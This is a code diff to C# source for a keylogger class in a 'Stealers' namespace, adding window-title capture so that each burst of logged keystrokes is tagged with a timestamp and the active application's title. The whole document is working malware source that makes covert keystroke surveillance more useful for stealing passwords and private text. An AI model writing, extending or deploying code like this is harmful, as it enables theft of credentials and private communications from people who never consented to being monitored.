@@ -5,6 +5,7 @@ using System.Collections.Generic;
 using System.Diagnostics;
 using System.Net.Mail;
 using System.Runtime.InteropServices;
+using System.Text;
 using System.Windows.Forms;
 using sub.Util.Misc;
 
@@ -67,10 +68,32 @@ namespace sub.Stealers
         private delegate IntPtr LowLevelKeyboardProc(
             int nCode, IntPtr wParam, IntPtr lParam);
 
+        //Window title
+        [DllImport("user32.dll")]
+        static extern IntPtr GetForegroundWindow();
+
+        [DllImport("user32.dll")]
+        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
+
+        private static string GetActiveWindowTitle()
+        {
+            const int nChars = 256;
+            IntPtr handle = IntPtr.Zero;
+            StringBuilder Buff = new StringBuilder(nChars);
+            handle = GetForegroundWindow();
+
+            if (GetWindowText(handle, Buff, nChars) > 0)
+            {
+                return Buff.ToString();
+            }
+            return null;
+        }
+
         #endregion
 
         private bool _capslock;
         private string _name = "Keylogger";
+        private string _windowTitle = "";
 
         private bool _shift;
 
@@ -104,6 +127,14 @@ namespace sub.Stealers
 
         private void ProcessKeyDown(int code)
         {
+            //look for a change in the window title, if so add it to the log
+            //Note: due to the lack of a desire to waste CPU cycles to check for it every time, the log will always start with \r\n which isn't a huge deal
+            if (_windowTitle != GetActiveWindowTitle())
+            {
+                _windowTitle = GetActiveWindowTitle();
+                Data += string.Format("\r\n[{0}][{1}]\r\n", DateTime.Now, _windowTitle);
+            }
+
             if (code >= 65 && code <= 90)
             {
                 Data += (_shift ^ _capslock) ? ((Keys) code).ToString() : ((Keys) code).ToString().ToLower();
